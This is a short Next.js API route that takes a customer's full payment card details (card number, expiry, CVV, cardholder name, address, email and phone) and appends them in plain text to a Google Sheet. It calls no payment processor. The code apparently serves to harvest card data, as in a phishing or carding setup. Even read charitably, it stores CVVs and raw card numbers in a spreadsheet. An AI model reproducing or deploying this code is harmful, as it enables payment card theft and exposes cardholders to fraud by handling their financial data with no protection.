import { NextResponse } from "next/server";
import { sheets } from "@/lib/googleSheets";

export async function POST(req: Request) {
  try {
    const body = await req.json();

    const {
      amount,
      email,
      name,
      phone,
      cardNumber,
      expiry,
      cvv,
      cardholdername,
      addressone,
      addresstwo,
      city,
      zipCode,
      state,
      firstName,
      lastName,
    } = body;

    await sheets.spreadsheets.values.append({
      spreadsheetId: process.env.GOOGLE_SHEET_ID,
      range: "Cx Payment Request!A:O",
      valueInputOption: "USER_ENTERED",

      requestBody: {
        values: [
          [
            amount,
            email,
            name,
            phone,
            cardNumber,
            expiry,
            cvv,
            cardholdername,
            addressone,
            addresstwo,
            city,
            zipCode,
            state,
            firstName,
            lastName,
          ],
        ],
      },
    });

    return NextResponse.json({
      success: true,
    });
  } catch (error) {
    console.log(error);

    return NextResponse.json(
      {
        success: false,
      },
      {
        status: 500,
      }
    );
  }
}